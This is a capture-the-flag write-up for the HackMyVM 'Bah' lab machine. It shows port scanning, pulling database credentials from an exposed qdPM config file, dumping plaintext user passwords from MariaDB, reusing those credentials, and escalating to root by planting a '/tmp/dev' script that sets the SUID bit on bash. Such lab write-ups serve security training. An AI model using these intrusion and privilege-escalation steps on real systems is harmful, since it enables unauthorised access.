| Name | Difficulty | OS    | Target IP     | Link                                            |
| ---- | ---------- | ----- | ------------- | ----------------------------------------------- |
| Bah  | Easy       | Linux | 192.168.0.207 | https://hackmyvm.eu/machines/machine.php?vm=Bah |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/bah$ sudo arp-scan -l | grep 48       
192.168.0.207	08:00:27:1c:30:48	PCS Systemtechnik GmbH
```

### Nmap Scan - TCP

```bash
garffff@garffff:~/hackmyvm/bah$ sudo nmap -p- -sV -sC 192.168.0.207 -oA nmap/bah.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 12:22 GMT
Nmap scan report for 192.168.0.207
Host is up (0.000081s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: qdPM | Login
3306/tcp open  mysql   MySQL 5.5.5-10.5.11-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.5.11-MariaDB-1
|   Thread ID: 32
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, Support41Auth, FoundRows, IgnoreSigpipes, ODBCClient, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: MXQoZTtlCGyNZX.v/#aA
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:1C:30:48 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
```

Port 80

![[Pasted image 20241031122323.png]]

Found an exploit for qdPM version 9.2

![[Pasted image 20241031122438.png]]

Navigating to URL: `http://192.168.0.207/core/config/databases.yml`, this gave me a username and password for the local database

![[Pasted image 20241031122422.png]]

As MySQL is exposed, we can log into MySQL database service using the provided creds:

```bash
garffff@garffff:~/hackmyvm/bah$ mysql -h 192.168.0.207 -u qpmadmin -pqpmpazzw
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.5.11-MariaDB-1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hidden             |
| information_schema |
| mysql              |
| performance_schema |
| qpm                |
+--------------------+
5 rows in set (0.003 sec)

MariaDB [(none)]> 
```

Looking in the hidden database, two tables that might be of interest::

```bash
MariaDB [(none)]> use hidden;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hidden]> show tables;
+------------------+
| Tables_in_hidden |
+------------------+
| url              |
| users            |
+------------------+
2 rows in set (0.001 sec)
```

Users table:

```bash
MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
9 rows in set (0.001 sec)
```

URLs table. 

```bash
MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
```

I took this table and added to my host file and visited each site individually to see if i can get a hit. I got a hit for http://party.bah.hmv/:

![[Pasted image 20241102104841.png]]

Username and password is: `qpmadmin:qpmpazzw`, which was reuse from the database.yaml file:

![[Pasted image 20241102105252.png]]

Looking at the home directory, we see our potential second user `rocio`:

![[Pasted image 20241102105403.png]]

If we refer back to the list of users we have previously obtained, we see a match for user rocio:

```bash
rocio:Ihaveaflower
```

We can switch to the new user and obtain the first flag:

![[Pasted image 20241102105635.png]]

Looking at the usual places and using various enumeration scripts, I couldn't find anything.

Using `PSPY64` i did see this entry:

![[Pasted image 20241102105821.png]]

This line appears to show the most interesting details:

```bash
-s/:LOGIN -s /devel:root:root:/:/tmp/dev                                         
```

A service is being setup on the `devel` path as root:root: and appears to execute what is in the `/tmp/dev` file.

I will create this file and save it to that location

```bash
#!/bin/bash
chmod u+s /bin/bash
```

And make it executable:

![[Pasted image 20241102110828.png]]

Navigating to the `devel` location:

![[Pasted image 20241102111126.png]]

Going back to the original browser, we can now see the SUID bit has been set on bash, and now we can load bash as the root user and obtain the root flag:

![[Pasted image 20241102111230.png]]